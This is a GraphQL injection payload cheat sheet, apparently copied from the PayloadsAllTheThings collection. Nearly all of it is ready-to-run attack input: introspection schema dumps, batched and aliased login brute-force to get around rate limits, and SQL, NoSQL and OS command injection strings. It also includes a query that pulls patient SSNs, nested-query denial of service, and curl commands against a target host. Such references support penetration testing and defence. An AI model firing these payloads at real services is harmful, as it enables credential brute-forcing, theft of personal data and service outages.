# GraphQL Injection Payloads

> Source: PayloadsAllTheThings — GraphQL Injection

## Endpoint Discovery

Common GraphQL endpoints to probe:

```
/graphql
/graphiql
/v1/graphql
/v2/graphql
/api/graphql
/graphql/console
/query
/gql
```

## Introspection Queries

### List All Types

```graphql
{__schema{types{name}}}
```

### Full Schema Dump

```graphql
{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
```

### Enumerate Specific Type

```graphql
{__type(name: "User") {
  name
  fields {
    name
    type { name kind ofType { name kind } }
  }
}}
```

### List Queries and Mutations

```graphql
{__schema { queryType { fields { name description args { name type { name } } } } }}
{__schema { mutationType { fields { name description args { name type { name } } } } }}
```

## Batching Attacks (Rate Limit Bypass)

### JSON Array Batching

```json
[
  {"query": "mutation{login(username:\"admin\",password:\"pass1\"){token}}"},
  {"query": "mutation{login(username:\"admin\",password:\"pass2\"){token}}"},
  {"query": "mutation{login(username:\"admin\",password:\"pass3\"){token}}"},
  {"query": "mutation{login(username:\"admin\",password:\"pass4\"){token}}"},
  {"query": "mutation{login(username:\"admin\",password:\"pass5\"){token}}"}
]
```

### Alias-Based Batching (Single Request)

```graphql
mutation {
  a1: login(username: "admin", password: "pass1") { token }
  a2: login(username: "admin", password: "pass2") { token }
  a3: login(username: "admin", password: "pass3") { token }
  a4: login(username: "admin", password: "pass4") { token }
  a5: login(username: "admin", password: "pass5") { token }
}
```

## Field Suggestion Abuse

Query a nonexistent field to trigger suggestions revealing the schema:

```graphql
{doesnotexist}
```

Response: `Cannot query field 'doesnotexist' on type 'Query'. Did you mean 'users'?`

```graphql
{user(id: 1) {doesnotexist}}
```

Response: `Did you mean 'username', 'email', 'password'?`

## Injection in Variables

### SQL Injection via GraphQL

```graphql
{
  user(id: "1' OR 1=1--") {
    id
    username
    email
  }
}
```

```graphql
{
  product(id: "1' UNION SELECT username,password FROM users--") {
    name
    price
  }
}
```

### NoSQL Injection via GraphQL

```graphql
{
  doctors(search: "{\"patients.ssn\": {\"$regex\": \".*\"}, \"lastName\": \"Admin\"}") {
    firstName
    lastName
    patients { ssn }
  }
}
```

### OS Command Injection

```graphql
{
  systemHealth(host: "127.0.0.1; id") {
    status
  }
}
```

## Denial of Service

### Deeply Nested Query

```graphql
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              name
            }
          }
        }
      }
    }
  }
}
```

### Alias-Based DoS

```graphql
{
  a1: users { id name }
  a2: users { id name }
  a3: users { id name }
  # ... repeat 1000 times
}
```

## Data Extraction

```graphql
# Enumerate all users
{users{id username email role}}

# Access admin-only fields
{user(id:1){id username email password isAdmin}}

# Dump all records
{teams{total_count edges{node{id name handle state}}}}
```

## Curl Examples

```bash
# Introspection query
curl -s -X POST http://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'

# Batched login brute-force
curl -s -X POST http://target/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"mutation{login(u:\"admin\",p:\"pass1\"){token}}"},{"query":"mutation{login(u:\"admin\",p:\"pass2\"){token}}"}]'

# GET-based query
curl "http://target/graphql?query=\{__schema\{types\{name\}\}\}"
```
